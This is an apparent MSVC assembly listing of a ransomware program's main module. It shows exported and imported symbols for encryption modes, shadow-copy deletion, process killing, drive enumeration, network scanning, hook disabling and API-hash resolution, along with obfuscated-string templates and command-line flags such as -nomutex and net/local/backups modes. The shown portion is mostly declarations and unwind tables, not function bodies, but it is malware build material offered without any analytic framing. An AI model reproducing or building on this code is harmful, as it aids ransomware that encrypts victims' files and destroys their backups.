PUBLIC	?decrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
PUBLIC	??0?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	??0?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
PUBLIC	??0?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
PUBLIC	??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >
PUBLIC	??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>
PUBLIC	??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
PUBLIC	??$_Convert_size@_K_K@std@@YA_K_K@Z		; std::_Convert_size<unsigned __int64,unsigned __int64>
PUBLIC	??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z		; std::_Unfancy<wchar_t>
PUBLIC	??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator()
PUBLIC	??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
PUBLIC	??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z	; std::_Destroy_in_place<wchar_t *>
PUBLIC	??$max@_K@std@@YAAEB_KAEB_K0@Z			; std::max<unsigned __int64>
PUBLIC	??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z	; std::_Deallocate<16,0>
PUBLIC	??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
PUBLIC	??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
PUBLIC	??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z	; std::addressof<wchar_t *>
PUBLIC	??$min@_K@std@@YAAEB_KAEB_K0@Z			; std::min<unsigned __int64>
PUBLIC	??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
PUBLIC	??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ; std::_Allocate<16,std::_Default_allocate_traits,0>
PUBLIC	??$_Get_size_of_n@$01@std@@YA_K_K@Z		; std::_Get_size_of_n<2>
PUBLIC	??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
PUBLIC	__JustMyCode_Default
PUBLIC	??_7exception@std@@6B@				; std::exception::`vftable'
PUBLIC	??_C@_0BC@EOODALEL@Unknown?5exception@		; `string'
PUBLIC	??_7bad_alloc@std@@6B@				; std::bad_alloc::`vftable'
PUBLIC	??_7bad_array_new_length@std@@6B@		; std::bad_array_new_length::`vftable'
PUBLIC	??_C@_0BF@KINCDENJ@bad?5array?5new?5length@	; `string'
PUBLIC	??_R0?AVexception@std@@@8			; std::exception `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
PUBLIC	_TI3?AVbad_array_new_length@std@@
PUBLIC	_CTA3?AVbad_array_new_length@std@@
PUBLIC	??_R0?AVbad_array_new_length@std@@@8		; std::bad_array_new_length `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
PUBLIC	??_R0?AVbad_alloc@std@@@8			; std::bad_alloc `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
PUBLIC	??_C@_0BA@JFNIOLAK@string?5too?5long@		; `string'
PUBLIC	?g_Path@@3V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@A ; g_Path
PUBLIC	??_C@_15JODAOICI@?$AA?9?$AAp@			; `string'
PUBLIC	??_C@_15DMEDGHGK@?$AA?9?$AAm@			; `string'
PUBLIC	??_C@_19HOMBNICI@?$AA?9?$AAl?$AAo?$AAg@		; `string'
PUBLIC	??_C@_1M@HGCPEPBL@?$AA?9?$AAs?$AAi?$AAz?$AAe@	; `string'
PUBLIC	??_C@_1BC@INLGKNFA@?$AA?9?$AAn?$AAo?$AAm?$AAu?$AAt?$AAe?$AAx@ ; `string'
PUBLIC	??_C@_17IIFKAHCJ@?$AAa?$AAl?$AAl@		; `string'
PUBLIC	??_C@_1M@GFKCHEPI@?$AAl?$AAo?$AAc?$AAa?$AAl@	; `string'
PUBLIC	??_C@_17ODNIDLDN@?$AAn?$AAe?$AAt@		; `string'
PUBLIC	??_C@_1BA@FMKEKOCJ@?$AAb?$AAa?$AAc?$AAk?$AAu?$AAp?$AAs@ ; `string'
PUBLIC	??_C@_0BK@DGNDOENM@hsfjuukjzloqu28oajh727190@	; `string'
PUBLIC	??_R4exception@std@@6B@				; std::exception::`RTTI Complete Object Locator'
PUBLIC	??_R3exception@std@@8				; std::exception::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2exception@std@@8				; std::exception::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@exception@std@@8			; std::exception::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_alloc@std@@6B@				; std::bad_alloc::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_alloc@std@@8				; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_alloc@std@@8				; std::bad_alloc::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_alloc@std@@8			; std::bad_alloc::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_array_new_length@std@@6B@		; std::bad_array_new_length::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_array_new_length@std@@8		; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_array_new_length@std@@8		; std::bad_array_new_length::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_array_new_length@std@@8	; std::bad_array_new_length::`RTTI Base Class Descriptor at (0,-1,0,64)'
EXTRN	??2@YAPEAX_K@Z:PROC				; operator new
EXTRN	??3@YAXPEAX_K@Z:PROC				; operator delete
EXTRN	atexit:PROC
EXTRN	_invalid_parameter_noinfo_noreturn:PROC
EXTRN	memcpy:PROC
EXTRN	memmove:PROC
EXTRN	wcslen:PROC
EXTRN	__std_exception_copy:PROC
EXTRN	__std_exception_destroy:PROC
EXTRN	??_Eexception@std@@UEAAPEAXI@Z:PROC		; std::exception::`vector deleting destructor'
EXTRN	??_Ebad_alloc@std@@UEAAPEAXI@Z:PROC		; std::bad_alloc::`vector deleting destructor'
EXTRN	??_Ebad_array_new_length@std@@UEAAPEAXI@Z:PROC	; std::bad_array_new_length::`vector deleting destructor'
EXTRN	?_Xlength_error@std@@YAXPEBD@Z:PROC		; std::_Xlength_error
EXTRN	?InitializeGetapiModule@getapi@@YAHXZ:PROC	; getapi::InitializeGetapiModule
EXTRN	?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z:PROC	; getapi::GetProcAddressEx2
EXTRN	?DisableHooks@@YAXXZ:PROC			; DisableHooks
EXTRN	?SetEncryptMode@global@@YAXH@Z:PROC		; global::SetEncryptMode
EXTRN	?GetEncryptMode@global@@YAHXZ:PROC		; global::GetEncryptMode
EXTRN	?SetEncryptSize@global@@YAHH@Z:PROC		; global::SetEncryptSize
EXTRN	?m_malloc@@YAPEAX_K@Z:PROC			; m_malloc
EXTRN	?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z:PROC ; filesystem::EnumirateDrives
EXTRN	?Create@threadpool@@YAHH_K@Z:PROC		; threadpool::Create
EXTRN	?Start@threadpool@@YAHH@Z:PROC			; threadpool::Start
EXTRN	?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z:PROC ; threadpool::PutTask
EXTRN	?IsActive@threadpool@@YAHH@Z:PROC		; threadpool::IsActive
EXTRN	?Wait@threadpool@@YAXH@Z:PROC			; threadpool::Wait
EXTRN	?StartScan@network_scanner@@YAXXZ:PROC		; network_scanner::StartScan
EXTRN	?Init@logs@@YAXPEB_W@Z:PROC			; logs::Init
EXTRN	?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z:PROC ; process_killer::GetWhiteListProcess
EXTRN	?SetWhiteListProcess@cryptor@@YAXPEAUPID_LIST@process_killer@@@Z:PROC ; cryptor::SetWhiteListProcess
EXTRN	?DeleteShadowCopies@cryptor@@YAFPEAX@Z:PROC	; cryptor::DeleteShadowCopies
EXTRN	_CxxThrowException:PROC
EXTRN	_RTC_CheckStackVars:PROC
EXTRN	_RTC_InitBase:PROC
EXTRN	_RTC_Shutdown:PROC
EXTRN	__CheckForDebuggerJustMyCode:PROC
EXTRN	__GSHandlerCheck:PROC
EXTRN	__security_check_cookie:PROC
EXTRN	??_7type_info@@6B@:BYTE				; type_info::`vftable'
EXTRN	__security_cookie:QWORD
_BSS	SEGMENT
?g_Path@@3V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@A DB 020H DUP (?) ; g_Path
_BSS	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$WinMain DD imagerel $LN35
	DD	imagerel $LN35+994
	DD	imagerel $unwind$WinMain
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??2@YAPEAX_KPEAX@Z DD imagerel $LN3
	DD	imagerel $LN3+53
	DD	imagerel $unwind$??2@YAPEAX_KPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max@?$numeric_limits@_J@std@@SA_JXZ DD imagerel $LN3
	DD	imagerel $LN3+47
	DD	imagerel $unwind$?max@?$numeric_limits@_J@std@@SA_JXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0exception@std@@QEAA@QEBDH@Z DD imagerel $LN3
	DD	imagerel $LN3+116
	DD	imagerel $unwind$??0exception@std@@QEAA@QEBDH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0exception@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+123
	DD	imagerel $unwind$??0exception@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1exception@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$??1exception@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?what@exception@std@@UEBAPEBDXZ DD imagerel $LN5
	DD	imagerel $LN5+96
	DD	imagerel $unwind$?what@exception@std@@UEBAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gexception@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+82
	DD	imagerel $unwind$??_Gexception@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_alloc@std@@AEAA@QEBD@Z DD imagerel $LN3
	DD	imagerel $LN3+95
	DD	imagerel $unwind$??0bad_alloc@std@@AEAA@QEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1bad_alloc@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$??1bad_alloc@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_alloc@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$??0bad_alloc@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gbad_alloc@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+82
	DD	imagerel $unwind$??_Gbad_alloc@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_array_new_length@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+84
	DD	imagerel $unwind$??0bad_array_new_length@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1bad_array_new_length@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$??1bad_array_new_length@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_array_new_length@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$??0bad_array_new_length@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gbad_array_new_length@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+82
	DD	imagerel $unwind$??_Gbad_array_new_length@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Throw_bad_array_new_length@std@@YAXXZ DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?_Throw_bad_array_new_length@std@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z DD imagerel $LN3
	DD	imagerel $LN3+53
	DD	imagerel $unwind$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z DD imagerel $LN11
	DD	imagerel $LN11+181
	DD	imagerel $unwind$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Orphan_all@_Container_base0@std@@QEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$?_Orphan_all@_Container_base0@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z DD imagerel $LN3
	DD	imagerel $LN3+46
	DD	imagerel $unwind$?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+58
	DD	imagerel $unwind$??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+90
	DD	imagerel $unwind$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+90
	DD	imagerel $unwind$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+53
	DD	imagerel $unwind$?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+66
	DD	imagerel $unwind$?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Xlen_string@std@@YAXXZ DD imagerel $LN3
	DD	imagerel $LN3+49
	DD	imagerel $unwind$?_Xlen_string@std@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$allocator@_W@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??0?$allocator@_W@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+76
	DD	imagerel $unwind$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+66
	DD	imagerel $unwind$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z DD imagerel $LN3
	DD	imagerel $LN3+53
	DD	imagerel $unwind$?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+93
	DD	imagerel $unwind$??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ DD imagerel $LN4
	DD	imagerel $LN4+94
	DD	imagerel $unwind$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ DD imagerel $LN4
	DD	imagerel $LN4+94
